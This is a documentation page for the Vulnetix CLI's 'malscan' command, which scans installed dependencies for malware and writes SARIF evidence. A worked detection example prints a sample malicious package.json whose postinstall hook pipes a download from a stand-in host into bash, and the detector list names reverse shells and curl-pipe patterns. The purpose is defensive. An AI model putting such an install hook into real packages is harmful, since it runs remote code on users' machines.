---
title: "Malscan Command Reference"
weight: 10
description: "Scan your locally-installed dependencies for malware in-process — STIX IOCs, manifest/install-script pattern detection, and known-bad artifact hashing — with SARIF evidence."
---

The `malscan` command runs the malscan-engine **in-process** against your project's locally-installed dependencies — the actual bytes on disk in `node_modules`, `site-packages`, `vendor`, `~/.cargo`, and friends. Unlike `--block-malware` on the [`scan`]({{< relref "scan" >}}) / [`sca`]({{< relref "sca" >}}) path (which asks the backend for the known-malicious verdict of each resolved package), `malscan` inspects the installed code itself, so it catches embedded payloads and install-script behaviour that a package-name lookup never sees.

> **Credentials are optional.** Findings are always written to `.vulnetix/malscan.sarif`. They are uploaded to Vulnetix only when you are authenticated; community/unauthenticated runs scan and report locally without persisting.

## Usage

```bash
vulnetix malscan [path] [flags]
```

## Detector families

Four detectors run over every resolved scan target:

- **iocscan** — STIX IOC filesystem scan. Matches known-bad domains, IPs, and URLs in text files (and in printable strings extracted from binaries), with file + line + surrounding-context evidence. Feeds are fetched from the Vulnetix malscan STIX index and cached locally.
- **detect** — Manifest / install-script pattern detection plus shell-obfuscation analysis (e.g. `curl … | bash` in an npm `postinstall`, download-and-execute, reverse shells, `.onion` C2).
- **ioc** — Indicators of compromise extracted from manifests and install scripts (exfil endpoints, wallet addresses, install commands), attached to malicious findings.
- **badhash** — Known-bad artifact-hash blocklist, checked against the integrity checksums declared in package manifests.

## Flags

| Flag | Type | Default | Description |
|------|------|---------|-------------|
| `--path` | string | `.` | Directory to scan. Defaults to the current directory and resolves to the enclosing git root; an explicit `--path` (or positional `[path]`) is used as-is. |
| `--include-home` | bool | `false` | Also scan user-scoped/home install caches (`~/.npm`, `~/go/pkg/mod`, `~/.cargo`, `~/.m2`, …). Off by default because these caches are shared across all projects. |
| `-o, --output` | string | `pretty` | Terminal output format: `pretty`, `json`, or `sarif`. |
| `--output-file` | string | - | Path to write the SARIF report. Default: `<path>/.vulnetix/malscan.sarif`. |
| `--no-binary-analysis` | bool | `false` | Do not extract / match IOCs in binary files. |
| `--scan-depth` | int | `0` | Max directory depth per target (`0` = unlimited). |
| `--max-file-size` | int64 | `10485760` | Skip files larger than this many bytes (default 10 MiB). |
| `--no-ioc-feeds` | bool | `false` | Skip the STIX IOC filesystem scan (no network); run only the `detect` + `badhash` detectors. |
| `--catalog` | string | - | Directory of malscan capability-config overrides (sets `MALSCAN_CONFIG_DIR`). |
| `--no-upload` | bool | `false` | Do not submit findings to Vulnetix (findings are submitted automatically when authenticated). |

## Scan targets

Targets are resolved per ecosystem. Project-local install directories are always scanned; the user-scoped/home caches in the right column are scanned only with `--include-home`.

| Ecosystem | Project-local | User-scoped (`--include-home`) |
|-----------|---------------|--------------------------------|
| JavaScript (npm/pnpm/yarn/bun) | `node_modules`, `.yarn/cache`, `.yarn/unplugged`, `.pnpm-store` | `~/.npm` (or `$npm_config_cache`), `~/.bun/install/cache`, pnpm store, `~/.yarn/cache`, `~/.cache/yarn` |
| Python (pip/venv) | `.venv`, `venv`, `env`, `.tox`, `__pypackages__` | `~/.cache/pip`, `~/.local/pipx`, user `site-packages`, macOS pip cache |
| Go | `vendor` (with `go.mod`) | `$GOMODCACHE` or `~/go/pkg/mod` |
| Rust (cargo) | `vendor`, `target` (with `Cargo.toml`) | `$CARGO_HOME/registry`, `$CARGO_HOME/git` |
| Ruby (rubygems) | `vendor/bundle`, `.bundle` | `$GEM_HOME` or `~/.gem` |
| PHP (composer) | `vendor` (with `composer.json`) | `~/.composer`, `~/.config/composer` |
| Java (maven/gradle) | `target` (with `pom.xml`), `build` (with `build.gradle`) | `~/.m2/repository`, `~/.gradle/caches` |
| .NET (nuget) | `packages` (with a solution/project) | `$NUGET_PACKAGES` or `~/.nuget/packages` |
| Dart (pub) | `.dart_tool` | `$PUB_CACHE` or `~/.pub-cache` |
| Elixir (hex) | `deps`, `_build` (with `mix.exs`) | `~/.hex`, `~/.mix` |

Only directories that exist on disk are scanned, and a shared `vendor/` is attributed to a single ecosystem by the manifest present at the root, so it is never scanned twice.

## Output files

| File | When | Contents |
|------|------|----------|
| `.vulnetix/malscan.sarif` | Always (unless `--output-file` overrides) | SARIF 2.1.0 with one result per finding — rule id (e.g. `P-CURL-PIPE`, `IOC-STIX-MATCH`, `B-KNOWN-BAD-HASH`), severity/level, the matched code sample + context, CWE, ecosystem, and the host/git context embedded in the run properties. |

When authenticated, the SARIF and the extracted IOCs (with offending-file samples) are uploaded to `/v2/cli.malscan`, which persists a `MALWARE` scanner run, snapshot, findings, triage, OpenVEX, and `MalwareIoc` records with the samples stored to object storage.

## Examples

```bash
# Scan the current project's installed dependencies (pretty summary; writes .vulnetix/malscan.sarif)
vulnetix malscan

# Scan a specific directory
vulnetix malscan ./my-app

# Also scan the shared home caches (~/.npm, ~/go/pkg/mod, ~/.cargo, …)
vulnetix malscan --include-home

# Emit the findings as JSON or SARIF to stdout (the file is still written)
vulnetix malscan -o json
vulnetix malscan -o sarif

# Offline / air-gapped: skip the STIX network fetch, run detect + badhash only
vulnetix malscan --no-ioc-feeds

# Write the SARIF somewhere else and don't upload
vulnetix malscan --output-file build/malscan.sarif --no-upload
```

### Verified example

Running `malscan` against a project whose `node_modules` contains a package with a malicious `postinstall` hook:

```jsonc
// package.json (installed dependency)
{ "name": "evil-pkg", "version": "1.0.0",
  "scripts": { "postinstall": "curl -s http://malware.example/payload.sh | bash" } }
```

```text
MALWARE SCAN

  1 target(s) scanned, 0 file(s) inspected, 0 known-bad indicator(s) loaded

SCAN TARGETS
Ecosystem   Feed  Scope    Location
javascript  npm   project  node_modules

FINDINGS
Severity  Rule            Class     Ecosystem   Location
critical  P-CURL-PIPE     evidence  javascript  node_modules/evil-pkg/package.json:5
critical  P-INSTALL-CURL  evidence  javascript  node_modules/evil-pkg/package.json
...

  malware findings detected — see .vulnetix/malscan.sarif for full evidence.
```

The process exits `1` whenever malware is found, so a bare `vulnetix malscan` is a drop-in CI gate.

## Exit codes

| Code | Meaning |
|------|---------|
| `0` | No malware detected |
| `1` | Malware detected (direct `malscan` usage), or a fatal error |

## Integration with `scan` and `sca`

The same in-process pass runs as part of the broader scan flow:

- [`scan`]({{< relref "scan" >}}) runs `malscan` as a pass by default (disable with `--no-malscan`). It always uploads findings; it contributes a `malware` quality-gate breach only when `--block-malware` — or the org's enforced `blockMalware` policy — is in effect.
- [`sca`]({{< relref "sca" >}}) runs `malscan` only when `--block-malware` (or the org `blockMalware` policy) is in effect, then gates on it.

This means `vulnetix scan --block-malware` and `vulnetix sca --block-malware` fail the build on **both** the backend known-malicious-package verdict and any locally-detected malware, while a clean `vulnetix scan` still captures a malscan snapshot for visibility without failing.

> **Malscan vs `--block-malware`.** `--block-malware` is a *policy gate* that asks "is any installed package a known-malicious release?" (a name+version lookup against Vulnetix intelligence). `malscan` is a *local scanner* that asks "is there malicious code or behaviour in the installed bytes?" (STIX IOCs, install-script patterns, bad hashes). They are complementary — run both for defence in depth.

## Related commands

{{< cards >}}
{{< card link="scan" title="scan" subtitle="Full local scan — SCA, SAST, secrets, containers, IaC, licenses." icon="terminal" >}}
{{< card link="sca" title="sca" subtitle="Software Composition Analysis with quality-gate enforcement." icon="cube" >}}
{{< card link="aibom" title="aibom" subtitle="Discover AI coding agents and AI usage; emit a CycloneDX AIBOM." icon="chip" >}}
{{< /cards >}}
